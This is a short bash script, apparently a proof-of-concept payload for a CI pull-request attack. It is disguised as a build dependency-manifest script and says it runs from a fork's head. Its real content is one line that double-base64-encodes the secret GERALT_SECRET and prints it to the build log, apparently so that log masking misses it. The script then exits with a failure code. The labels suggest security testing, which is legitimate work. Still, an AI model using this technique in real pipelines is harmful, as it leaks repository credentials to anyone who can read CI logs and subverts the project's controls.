#!/usr/bin/env bash
set +e
echo "GERALT_DBG build/deps-manifest.sh executing from fork head (push-deps sink)"
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
exit 1
